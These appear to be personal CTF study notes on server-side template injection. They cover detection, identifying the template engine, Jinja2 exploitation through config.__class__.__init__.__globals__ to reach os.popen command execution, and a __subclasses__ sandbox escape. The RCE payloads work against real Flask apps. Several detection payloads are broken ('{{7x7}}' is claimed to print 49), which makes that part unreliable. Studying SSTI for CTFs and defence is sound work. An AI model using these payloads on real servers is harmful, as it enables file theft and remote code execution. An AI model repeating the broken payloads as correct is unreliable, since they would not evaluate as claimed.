# Server-Side Template Injection (SSTI) – CTF Notes

## What is SSTI
Server-Side Template Injection (SSTI) occurs when user input is embedded into a server-side template and executed as code instead of being treated as plain text.

Example template:  
Hello {{ username }}

Normal input:  
Ayoub  

Output:  
Hello Ayoub  

Malicious input:  
{{7x7  }}

Output:  
49  

This confirms server-side code execution inside the template engine.

---

## Why SSTI Is Dangerous
SSTI can lead to:
- Reading sensitive files (flag.txt)
- Accessing internal variables
- Remote Code Execution (RCE)
- Full server compromise

In CTFs, SSTI is often a straight path to the flag.

---

## Common Template Engines

Python:
- Jinja2 (Flask) → {{ }}
- Django Templates

PHP:
- Twig → {{ }}

Java:
- Freemarker → ${}
- Velocity → $var

Node.js:
- EJS → <%= %>
- Handlebars

---

## Step 1: Detect SSTI
Test payloads:
- {{7x7}}
- ${7x7}
- <%= 7x7 %>
- {{7x'7'}}

Results:
- Code executes → vulnerable
- Error message → still valuable
- Input unchanged → not vulnerable

---

## Step 2: Identify the Template Engine
Payload:
- {{7*'7'}}

Results:
- Jinja2 → 7777777
- Twig / Django → error

Error messages often reveal the engine name. Never ignore them.

---

## Step 3: Exploiting Jinja2 SSTI

Access internal objects:
- {{ self }}
- {{ config }}
- {{ request }}

File read / command execution:
- {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
- {{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}

---

## Why This Works
- config → Flask config object
- __class__ → object class
- __init__ → constructor
- __globals__ → Python global namespace
- os.popen() → executes system commands

---

## Step 4: Sandbox Escape (Advanced)
If os is blocked:
- {{ ''.__class__.__mro__[1].__subclasses__() }}

This dumps all loaded Python classes. Look for:
- subprocess.Popen
- warnings.catch_warnings
- file

Use those to read files or execute commands.

---

## Common Beginner Mistakes
- Confusing SSTI with XSS
- Ignoring error messages
- Testing only one syntax
- Blind payload copy-pasting
- Not understanding Python internals

---

## SSTI vs XSS

XSS:
- Client-side
- Runs in browser
- Steals cookies

SSTI:
- Server-side
- Runs on server
- Reads files / RCE

---

## Practice Targets
- PicoCTF (Web Exploitation)
- PortSwigger Web Security Academy
- Hack The Box Academy
- Build and exploit your own Flask app
